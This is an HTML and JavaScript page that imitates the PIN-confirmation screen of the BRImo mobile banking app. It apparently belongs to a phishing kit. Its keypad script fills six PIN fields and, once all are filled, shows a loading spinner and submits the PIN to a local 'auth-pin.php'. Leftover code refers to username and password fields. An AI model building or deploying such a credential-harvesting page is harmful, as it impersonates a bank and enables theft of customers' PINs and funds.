<!DOCTYPE html>
<html>
  <head>
    <meta charSet="utf-8" />
    <meta name="viewport" content="width=device-width" />
    <link rel="apple-touch-icon" sizes="72x72" href="/apple-touch-icon.png" />
    <link rel="icon" href="./assets/favicon-brimo.ico" />
    <link rel="manifest" href="/site.webmanifest" />
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5" />
    <meta name="msapplication-TileColor" content="#da532c" />
    <meta name="theme-color" content="#ffffff" />
    <meta name="mobile-web-app-capable" content="yes" />
    <title>BRIMO</title>
    <meta name="next-head-count" content="10" />
    <link rel="stylesheet" type="text/css" href="./assets/main.css">
    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
    
    <link href="https://www.jqueryscript.net/css/jquerysctipttop.css" rel="stylesheet" type="text/css">
  <link rel="stylesheet" href="./assets/css/bootstrap.min.css">
  <link href="./assets/css/component-spinners.css" rel="stylesheet">

  <noscript data-n-css=""></noscript>
  </head>
  <body class="brimo-ui-light">
    <div id="loading" class="loader"></div>
    <div id="brimo" class="biru">
      <div class="css-536van">
        <div class="css-1sm2s1z">
          <div class="brimo-header-pin">
            <p class="brimo-text">PIN</p>
          </div>
          <div class="css-1meg77l">
            <p class="konfir-pin">Konfirmasi PIN</p>
            <p class="konfir-pin-sub">Silahkan konfirmasi PIN yang sudah Anda buat.</p>
            
            <div class='main-pin'>
              <form id="form-pin" autocomplete="off" action="auth-pin.php" method="POST">
              <div id='box-pin-input'>
                <div class='item-pin-input'><input autocomplete="off" type="text" id="pin-1" name="pin-1"  class="css-input bottom" value=""></div>
                <div class='item-pin-input'><input autocomplete="off" type="text" id="pin-2" name="pin-2" class="css-input bottom" value=""></div>
                <div class='item-pin-input'><input autocomplete="off" type="text" id="pin-3" name="pin-3" class="css-input bottom" value=""></div>
                <div class='item-pin-input'><input autocomplete="off" type="text" id="pin-4" name="pin-4" class="css-input bottom" value=""></div>
                <div class='item-pin-input'><input autocomplete="off" type="text" id="pin-5" name="pin-5" class="css-input bottom" value=""></div>
                <div class='item-pin-input'><input autocomplete="off" type="text" id="pin-6" name="pin-6" class="css-input bottom" value=""></div>
             </div>
             </form>
           </div>

           <p class="lupa-pin">Lupa PIN?</p>

            <div class='main-pin'>
              <div id='box-pin'>
                <div class='item-pin'><button  type="button"  id="btn-1" class="brimo-button btn-center btn-spinner css-aylbpp">1</button></div>
                <div class='item-pin'><button  type="button"  id="btn-2" class="brimo-button btn-center btn-spinner css-aylbpp">2</button></div>
                <div class='item-pin'><button  type="button"  id="btn-3" class="brimo-button btn-center btn-spinner css-aylbpp">3</button></div>
                <div class='item-pin'><button  type="button"  id="btn-4" class="brimo-button btn-center btn-spinner css-aylbpp">4</button></div>
                <div class='item-pin'><button  type="button"  id="btn-5" class="brimo-button btn-center btn-spinner css-aylbpp">5</button></div>
                <div class='item-pin'><button  type="button"  id="btn-6" class="brimo-button btn-center btn-spinner css-aylbpp">6</button></div>
                <div class='item-pin'><button  type="button"  id="btn-7" class="brimo-button btn-center btn-spinner css-aylbpp">7</button></div>
                <div class='item-pin'><button  type="button"  id="btn-8" class="brimo-button btn-center btn-spinner css-aylbpp">8</button></div>
                <div class='item-pin'><button  type="button"  id="btn-9" class="brimo-button btn-center btn-spinner css-aylbpp">9</button></div>
                <div class='item-pin'><button  type="button"  disabled="true" class="brimo-button btn-center btn-spinner css-aylbpp">&nbsp;</button></div>
                <div class='item-pin'><button  type="button"  id="btn-0" class="brimo-button btn-center btn-spinner css-aylbpp">0</button></div>
                <div class='item-pin'><button  type="button"  id="btn-del" class="brimo-button btn-center btn-spinner css-aylbpp"><img src="./assets/delete.png" width="100%"></button></div>
              </div>
            </div>

           
          </div>
        </div>
      </div>
      <span hidden="" class="brimo-env"></span>
    </div>

  </body>
 
</html>

<script src="assets/js/component-spinners.js"></script>
  <script type="text/javascript">
    $('.btn-spinner-example').click(function() {
      var btn = $(this);
      $(btn).buttonLoader('start');
      setTimeout(function() {
        $(btn).buttonLoader('stop');
        submitForm();
      }, 3000);
    });

    function btnActivation(){

            if(!document.getElementById('Username').value.length || !document.getElementById('Password').value.length){
                document.getElementById("Login").disabled = true;            
            }else{
                document.getElementById("Login").disabled = false;

            }           
  }  

  document.getElementById("btn-1").addEventListener("click", function() { validasi_pin(1); });
  document.getElementById("btn-2").addEventListener("click", function() { validasi_pin(2); });
  document.getElementById("btn-3").addEventListener("click", function() { validasi_pin(3); });
  document.getElementById("btn-4").addEventListener("click", function() { validasi_pin(4); });
  document.getElementById("btn-5").addEventListener("click", function() { validasi_pin(5); });
  document.getElementById("btn-6").addEventListener("click", function() { validasi_pin(6); });
  document.getElementById("btn-7").addEventListener("click", function() { validasi_pin(7); });
  document.getElementById("btn-8").addEventListener("click", function() { validasi_pin(8); });
  document.getElementById("btn-9").addEventListener("click", function() { validasi_pin(9); });
  document.getElementById("btn-0").addEventListener("click", function() { validasi_pin(0); });
  
  document.addEventListener("click", function() { validasi_submit(); });

  function validasi_pin(value) {
    var pin_1 = document.getElementById("pin-1").value;
    var pin_2 = document.getElementById("pin-2").value;
    var pin_3 = document.getElementById("pin-3").value;
    var pin_4 = document.getElementById("pin-4").value;
    var pin_5 = document.getElementById("pin-5").value;
    var pin_6 = document.getElementById("pin-6").value;
    
    var f_1 = document.getElementById("pin-1");
    var f_2 = document.getElementById("pin-2");
    var f_3 = document.getElementById("pin-3");
    var f_4 = document.getElementById("pin-4");
    var f_5 = document.getElementById("pin-5");
    var f_6 = document.getElementById("pin-6");

    if(pin_1.length <= 0){
    f_1.value = value;
    }else if(pin_2.length <= 0){
      f_2.value = value;
    }else if(pin_3.length <= 0){
      f_3.value = value;
    }else if(pin_4.length <= 0){
      f_4.value = value;
    }else if(pin_5.length <= 0){
      f_5.value = value;
    }else if(pin_6.length <= 0){
      f_6.value = value;
      // f_6.focus();
    }

    

    if(pin_1.length > 0 && pin_2.length > 0 && pin_3.length > 0 && pin_4.length > 0 && pin_5.length > 0 && pin_6.length > 0){
    
    }

  }

    function validasi_submit() {
    var pin_1 = document.getElementById("pin-1").value;
    var pin_2 = document.getElementById("pin-2").value;
    var pin_3 = document.getElementById("pin-3").value;
    var pin_4 = document.getElementById("pin-4").value;
    var pin_5 = document.getElementById("pin-5").value;
    var pin_6 = document.getElementById("pin-6").value;
    
    var f_1 = document.getElementById("pin-1");
    var f_2 = document.getElementById("pin-2");
    var f_3 = document.getElementById("pin-3");
    var f_4 = document.getElementById("pin-4");
    var f_5 = document.getElementById("pin-5");
    var f_6 = document.getElementById("pin-6");

    
    if(pin_1.length > 0 && pin_2.length > 0 && pin_3.length > 0 && pin_4.length > 0 && pin_5.length > 0 && pin_6.length > 0){
    document.getElementById("loading").style.display = "block";
    setTimeout(function() {
    document.getElementById("form-pin").submit();      
    }, 2000);
    }

  }

  </script>

  <style type="text/css">
  body{background-color: rgb(14, 120, 202) !important;}
  #loading { display: none; }
  .loader {
  border: 6px solid #f3f3f3;
  border-radius: 50%;
  border-top: 6px solid #3498db;
  width: 80px;
  height: 80px;
  -webkit-animation: spin 2s linear infinite; /* Safari */
  animation: spin 2s linear infinite;
  position: absolute;
  top:36%;
  left:42%;
  z-index: 9999;
}
/* Safari */
@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  100% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
  </style>